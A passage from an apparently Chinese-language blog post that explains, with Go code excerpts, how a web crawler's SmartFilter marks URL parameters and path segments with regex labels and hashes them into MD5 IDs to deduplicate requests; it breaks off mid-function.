class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *SmartFilter)</span></span> getMark(req *model.Request) &#123;<br><span class="hljs-comment">// 首先是解码前的预先替换</span><br>todoURL := *(req.URL)<br>todoURL.RawQuery = s.preQueryMark(todoURL.RawQuery)<br><br><span class="hljs-comment">// 将参数部分转换为 map</span><br>queryMap := todoURL.QueryMap()<br><span class="hljs-comment">// 对参数名打标记 数字和 long 标记</span><br>queryMap = markParamName(queryMap)<br><span class="hljs-comment">// 对参数值打标记 =&gt; map[paramName]标记</span><br>queryMap = s.markParamValue(queryMap, *req)<br>markedPath := MarkPath(todoURL.Path)<br><br><span class="hljs-comment">// 计算唯一的ID</span><br><span class="hljs-keyword">var</span> queryKeyID <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> queryMapID <span class="hljs-type">string</span><br>    <span class="hljs-comment">// 参数名和参数的 ID</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(queryMap) != <span class="hljs-number">0</span> &#123;<br>queryKeyID = getKeysID(queryMap)<br>queryMapID = getParamMapID(queryMap)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>queryKeyID = <span class="hljs-string">&quot;&quot;</span><br>queryMapID = <span class="hljs-string">&quot;&quot;</span><br>&#125;<br>pathID := getPathID(markedPath)<br><br>req.Filter.MarkedQueryMap = queryMap<br>req.Filter.QueryKeysId = queryKeyID<br>req.Filter.QueryMapId = queryMapID<br>req.Filter.MarkedPath = markedPath<span class="hljs-comment">// 存储打标记后的路径</span><br>req.Filter.PathId = pathID<br><br><span class="hljs-comment">// 最后计算标记后的唯一请求ID</span><br>req.Filter.UniqueId = getMarkedUniqueID(req)<br>&#125;<br></code></pre></td></tr></table></figure><p>preQueryMark 对原始的请求参数进行预先标记，这里的标记就是通过正则替换：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> chineseRegex = regexp.MustCompile(<span class="hljs-string">&quot;[\u4e00-\u9fa5]+&quot;</span>)<br><span class="hljs-keyword">var</span> urlencodeRegex = regexp.MustCompile(<span class="hljs-string">&quot;(?:%[A-Fa-f0-9]&#123;2,6&#125;)+&quot;</span>)<br><span class="hljs-keyword">var</span> unicodeRegex = regexp.MustCompile(<span class="hljs-string">`(?:\\u\w&#123;4&#125;)+`</span>)<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Query 的 Map 对象会自动解码，所以对 RawQuery 进行预先的标记 </span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *SmartFilter)</span></span> preQueryMark(rawQuery <span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">if</span> chineseRegex.MatchString(rawQuery) &#123;<br>        <span class="hljs-comment">// 中文正则的地方替换为 &#123;&#123;chinese&#125;&#125; 其他同理 这个就是打标记</span><br><span class="hljs-keyword">return</span> chineseRegex.ReplaceAllString(rawQuery, ChineseMark)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> urlencodeRegex.MatchString(rawQuery) &#123;<br><span class="hljs-keyword">return</span> urlencodeRegex.ReplaceAllString(rawQuery, UrlEncodeMark)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> unicodeRegex.MatchString(rawQuery) &#123;<br><span class="hljs-keyword">return</span> unicodeRegex.ReplaceAllString(rawQuery, UnicodeMark)<br>&#125;<br><span class="hljs-keyword">return</span> rawQuery<br>&#125;<br></code></pre></td></tr></table></figure><p>将请求参数转换为 map:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u *URL)</span></span> QueryMap() <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125; &#123;<br>    queryMap := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;&#125;<br>    <span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> u.Query() &#123;<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) == <span class="hljs-number">1</span> &#123;<br>          queryMap[key] = value[<span class="hljs-number">0</span>]<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>          queryMap[key] = value<br>       &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> queryMap<br>&#125;<br></code></pre></td></tr></table></figure><p>返回对 map 中的 key 也就是参数名打标记，参数名的标记仅标记过长和纯数字的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">markParamName</span><span class="hljs-params">(paramMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125; &#123;<br>markedParamMap := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;&#125;<br><span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> paramMap &#123;<br><span class="hljs-comment">// 纯字母不处理</span><br><span class="hljs-keyword">if</span> onlyAlphaRegex.MatchString(key) &#123;<br>markedParamMap[key] = value<br><span class="hljs-comment">// 参数名过长</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) &gt;= <span class="hljs-number">32</span> &#123;<br>markedParamMap[TooLongMark] = value<br><span class="hljs-comment">// 替换掉数字</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>key = replaceNumRegex.ReplaceAllString(key, NumberMark)<br>markedParamMap[key] = value<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> markedParamMap<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是参数值的标记，参数值是可变的所以就肯定是都标记的，这里的标记就是去初始化一个 map 存储 map[参数名]标记值 这样，其他的也是通过正则去进行标记替换，包含的很多模式，非字符类型，字符类型的大小写混合这种，考虑的很全：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *SmartFilter)</span></span> markParamValue(paramMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;, req model.Request) <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125; &#123;<br>markedParamMap := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;&#125;<br><span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> paramMap &#123;<br>        <span class="hljs-comment">// 先处理 bool list number 类型的标记</span><br><span class="hljs-keyword">switch</span> value.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-type">bool</span>:<br>markedParamMap[key] = BoolMark<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">case</span> types.Slice:<br>markedParamMap[key] = ListMark<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">case</span> <span class="hljs-type">float64</span>:<br>markedParamMap[key] = NumberMark<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 然后就是对 string 类型的处理</span><br>valueStr, ok := value.(<span class="hljs-type">string</span>)<br><span class="hljs-keyword">if</span> !ok &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// Crawlergo 为特定字符，说明此参数位置为数值型，非逻辑型，记录下此参数，全局过滤</span><br><span class="hljs-keyword">if</span> strings.Contains(valueStr, <span class="hljs-string">&quot;Crawlergo&quot;</span>) &#123;<br>name := req.URL.Hostname() + req.URL.Path + req.Method + key<br>s.filterLocationSet.Add(name)<br>markedParamMap[key] = CustomValueMark<br><span class="hljs-comment">// 全大写字母</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> onlyAlphaUpperRegex.MatchString(valueStr) &#123;<br>markedParamMap[key] = UpperMark<br><span class="hljs-comment">// 参数值长度大于等于16</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(valueStr) &gt;= <span class="hljs-number">16</span> &#123;<br>markedParamMap[key] = TooLongMark<br><span class="hljs-comment">// 均为数字和一些符号组成</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> onlyNumberRegex.MatchString(valueStr) || onlyNumberRegex.MatchString(numSymbolRegex.ReplaceAllString(valueStr, <span class="hljs-string">&quot;&quot;</span>)) &#123;<br>markedParamMap[key] = NumberMark<br><span class="hljs-comment">// 存在中文</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> chineseRegex.MatchString(valueStr) &#123;<br>markedParamMap[key] = ChineseMark<br><span class="hljs-comment">// urlencode</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> urlencodeRegex.MatchString(valueStr) &#123;<br>markedParamMap[key] = UrlEncodeMark<br><span class="hljs-comment">// unicode</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> unicodeRegex.MatchString(valueStr) &#123;<br>markedParamMap[key] = UnicodeMark<br><span class="hljs-comment">// 时间</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> onlyNumberRegex.MatchString(timeSymbolRegex.ReplaceAllString(valueStr, <span class="hljs-string">&quot;&quot;</span>)) &#123;<br>markedParamMap[key] = TimeMark<br><span class="hljs-comment">// 字母加数字</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> onlyAlphaNumRegex.MatchString(valueStr) &amp;&amp; numberRegex.MatchString(valueStr) &#123;<br>markedParamMap[key] = MixAlphaNumMark<br><span class="hljs-comment">// 含有一些特殊符号</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> hasSpecialSymbol(valueStr) &#123;<br>markedParamMap[key] = MixSymbolMark<br><span class="hljs-comment">// 数字出现的次数超过3，视为数值型参数</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> b := OneNumberRegex.ReplaceAllString(valueStr, <span class="hljs-string">&quot;0&quot;</span>); strings.Count(b, <span class="hljs-string">&quot;0&quot;</span>) &gt;= <span class="hljs-number">3</span> &#123;<br>markedParamMap[key] = MixNumMark<br><span class="hljs-comment">// 严格模式</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> s.StrictMode &#123;<br><span class="hljs-comment">// 无小写字母</span><br><span class="hljs-keyword">if</span> !alphaLowerRegex.MatchString(valueStr) &#123;<br>markedParamMap[key] = NoLowerAlphaMark<br><span class="hljs-comment">// 常见的值一般为 大写字母、小写字母、数字、下划线的任意组合，组合类型超过三种则视为伪静态</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>count := <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> alphaLowerRegex.MatchString(valueStr) &#123;<br>count += <span class="hljs-number">1</span><br>&#125;<br><span class="hljs-keyword">if</span> alphaUpperRegex.MatchString(valueStr) &#123;<br>count += <span class="hljs-number">1</span><br>&#125;<br><span class="hljs-keyword">if</span> numberRegex.MatchString(valueStr) &#123;<br>count += <span class="hljs-number">1</span><br>&#125;<br><span class="hljs-keyword">if</span> strings.Contains(valueStr, <span class="hljs-string">&quot;_&quot;</span>) || strings.Contains(valueStr, <span class="hljs-string">&quot;-&quot;</span>) &#123;<br>count += <span class="hljs-number">1</span><br>&#125;<br><span class="hljs-keyword">if</span> count &gt;= <span class="hljs-number">3</span> &#123;<br>markedParamMap[key] = MixStringMark<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 其他情况就是不打了</span><br>markedParamMap[key] = value<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> markedParamMap<br>&#125;<br></code></pre></td></tr></table></figure><p>之后是去做路径标记，路径标记就直接把匹配到的路径替换为空，然后再设置为标记位：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">MarkPath</span><span class="hljs-params">(path <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>pathParts := strings.Split(path, <span class="hljs-string">&quot;/&quot;</span>)<br><span class="hljs-keyword">for</span> index, part := <span class="hljs-keyword">range</span> pathParts &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &gt;= <span class="hljs-number">32</span> &#123;<br>pathParts[index] = TooLongMark<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> onlyNumberRegex.MatchString(numSymbolRegex.ReplaceAllString(part, <span class="hljs-string">&quot;&quot;</span>)) &#123;<br>pathParts[index] = NumberMark<br>            <span class="hljs-comment">// html 类型</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> strings.HasSuffix(part, <span class="hljs-string">&quot;.html&quot;</span>) || strings.HasSuffix(part, <span class="hljs-string">&quot;.htm&quot;</span>) || strings.HasSuffix(part, <span class="hljs-string">&quot;.shtml&quot;</span>) &#123;<br>            <span class="hljs-comment">// 替换到 .html 这种后缀</span><br>part = htmlReplaceRegex.ReplaceAllString(part, <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">// 大写、小写、数字混合</span><br><span class="hljs-keyword">if</span> numberRegex.MatchString(part) &amp;&amp; alphaUpperRegex.MatchString(part) &amp;&amp; alphaLowerRegex.MatchString(part) &#123;<br>pathParts[index] = MixAlphaNumMark<br><span class="hljs-comment">// 纯数字</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> b := numSymbolRegex.ReplaceAllString(part, <span class="hljs-string">&quot;&quot;</span>); onlyNumberRegex.MatchString(b) &#123;<br>pathParts[index] = NumberMark<br>&#125;<br><span class="hljs-comment">// 含有特殊符号</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> hasSpecialSymbol(part) &#123;<br>pathParts[index] = MixSymbolMark<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> chineseRegex.MatchString(part) &#123;<br>pathParts[index] = ChineseMark<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> unicodeRegex.MatchString(part) &#123;<br>pathParts[index] = UnicodeMark<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> onlyAlphaUpperRegex.MatchString(part) &#123;<br>pathParts[index] = UpperMark<br><span class="hljs-comment">// 均为数字和一些符号组成 先去掉一些符号 - _ 这些 然后看是否为纯数字 可能是针对如 /2024-01-02/ 这种 blog 类型的</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> b := numSymbolRegex.ReplaceAllString(part, <span class="hljs-string">&quot;&quot;</span>); onlyNumberRegex.MatchString(b) &#123;<br>pathParts[index] = NumberMark<br><span class="hljs-comment">// 数字出现的次数超过3，视为伪静态path </span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> b := OneNumberRegex.ReplaceAllString(part, <span class="hljs-string">&quot;0&quot;</span>); strings.Count(b, <span class="hljs-string">&quot;0&quot;</span>) &gt; <span class="hljs-number">3</span> &#123;<br>pathParts[index] = MixNumMark<br>&#125;<br>&#125;<br>newPath := strings.Join(pathParts, <span class="hljs-string">&quot;/&quot;</span>)<br><span class="hljs-keyword">return</span> newPath<br>&#125;<br></code></pre></td></tr></table></figure><p>返回是去生成参数名和参数部分的 ID：</p><p>参数名这里就是拼接然后 md5：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getKeysID</span><span class="hljs-params">(dataMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">var</span> keys []<span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> idStr <span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> key := <span class="hljs-keyword">range</span> dataMap &#123;<br>keys = <span class="hljs-built_in">append</span>(keys, key)<br>&#125;<br>sort.Strings(keys)<br><span class="hljs-keyword">for</span> _, key := <span class="hljs-keyword">range</span> keys &#123;<br>idStr += key<br>&#125;<br><span class="hljs-keyword">return</span> tools.StrMd5(idStr)<br>&#125;<br></code></pre></td></tr></table></figure><p>参数这里：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getParamMapID</span><span class="hljs-params">(dataMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">var</span> keys []<span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> idStr <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> markReplaceRegex = regexp.MustCompile(<span class="hljs-string">`&#123;&#123;.+&#125;&#125;`</span>)<br><span class="hljs-keyword">for</span> key := <span class="hljs-keyword">range</span> dataMap &#123;<br>keys = <span class="hljs-built_in">append</span>(keys, key)<br>&#125;<br>sort.Strings(keys)<br><span class="hljs-keyword">for</span> _, key := <span class="hljs-keyword">range</span> keys &#123;<br>value := dataMap[key]<br>idStr += key<br><span class="hljs-keyword">if</span> value, ok := value.(<span class="hljs-type">string</span>); ok &#123;<br>            <span class="hljs-comment">// 把参数值打过标记的部分替换成 &#123;&#123;mark&#125;&#125; 拼接后进行 MD5</span><br>idStr += markReplaceRegex.ReplaceAllString(value, <span class="hljs-string">&quot;&#123;&#123;mark&#125;&#125;&quot;</span>)<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> tools.StrMd5(idStr)<br>&#125;<br></code></pre></td></tr></table></figure><p>计算 Path ID 直接 MD5 :</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getPathID</span><span class="hljs-params">(path <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> tools.StrMd5(path)<br>&#125;<br></code></pre></td></tr></table></figure><p>然后赋值到 Filter 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">req.Filter.MarkedQueryMap = queryMap<br>req.Filter.QueryKeysId = queryKeyID<br>req.Filter.QueryMapId = queryMapID<br>req.Filter.MarkedPath = markedPath<br>req.Filter.PathId = pathID<br></code></pre></td></tr></table></figure><p>通过请求方法、参数ID、路径ID、Host、FragmentID、协议等组合起来 md5 后作为请求的 uniqueStr</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getMarkedUniqueID</span><span class="hljs-params">(req *model.Request)</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">var</span> paramId <span class="hljs-type">string</span><br><span class="hljs-keyword">if</span> req.Method == config.GET || req.Method == config.DELETE || req.Method == config.HEAD || req.Method == config.OPTIONS &#123;<br>paramId = req.Filter.QueryMapId<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>paramId = req.Filter.PostDataId<br>&#125;<br><br>uniqueStr := req.Method + paramId + req.Filter.PathId + req.URL.Host + req.Filter.FragmentID<br><span class="hljs-keyword">if</span> req.RedirectionFlag &#123;<br>uniqueStr += <span class="hljs-string">&quot;Redirection&quot;</span><br>&#125;<br><span class="hljs-keyword">if</span> req.URL.Path == <span class="hljs-string">&quot;/&quot;</span> &amp;&amp; req.URL.RawQuery == <span class="hljs-string">&quot;&quot;</span> &amp;&amp; req.URL.Scheme == <span class="hljs-string">&quot;https&quot;</span> &#123;<br>uniqueStr += <span class="hljs-string">&quot;https&quot;</span><br>&#125;<br><br><span class="hljs-keyword">return</span> tools.StrMd5(uniqueStr)<br>&#125;<br></code></pre></td></tr></table></figure><p>GET 、HEAD 等类型的请求还会做一个重复参数标记，这个其实就是去记录请求参数ID的数量，还有请求ID+参数名[参数值] 的数量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/*</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">进行全局重复参数名、参数值、路径的统计标记</span><br><span class="hljs-comment">之后对超过阈值的部分再次打标记</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *SmartFilter)</span></span> repeatCountStatistic(req *model.Request) &#123;<br>queryKeyId := req.Filter.QueryKeysId<br>pathId := req.Filter.PathId<br><span class="hljs-keyword">if</span> queryKeyId != <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-comment">// 所有参数名重复数量统计 =&gt; 存储 queryKeyId 和数量</span><br><span class="hljs-keyword">if</span> v, ok := s.filterParamKeyRepeatCount.Load(queryKeyId); ok &#123;<br>s.filterParamKeyRepeatCount.Store(queryKeyId, v.(<span class="hljs-type">int</span>)+<span class="hljs-number">1</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>s.filterParamKeyRepeatCount.Store(queryKeyId, <span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> req.Filter.MarkedQueryMap &#123;<br><span class="hljs-comment">// 某个URL的所有参数名重复数量统计 参数 key id + 该 key</span><br>paramQueryKey := queryKeyId + key<br><br><span class="hljs-keyword">if</span> set, ok := s.filterParamKeySingleValues.Load(paramQueryKey); ok &#123;<br>set := set.(mapset.Set)<br>set.Add(value)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>s.filterParamKeySingleValues.Store(paramQueryKey, mapset.NewSet(value))<br>&#125;<br><br><span class="hljs-comment">//本轮所有URL中某个参数重复数量统计</span><br><span class="hljs-keyword">if</span> _, ok := s.filterParamKeyAllValues.Load(key); !ok &#123;<br>s.filterParamKeyAllValues.Store(key, mapset.NewSet(value))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> v, ok := s.filterParamKeyAllValues.Load(key); ok &#123;<br>set := v.(mapset.Set)<br><span class="hljs-keyword">if</span> !set.Contains(value) 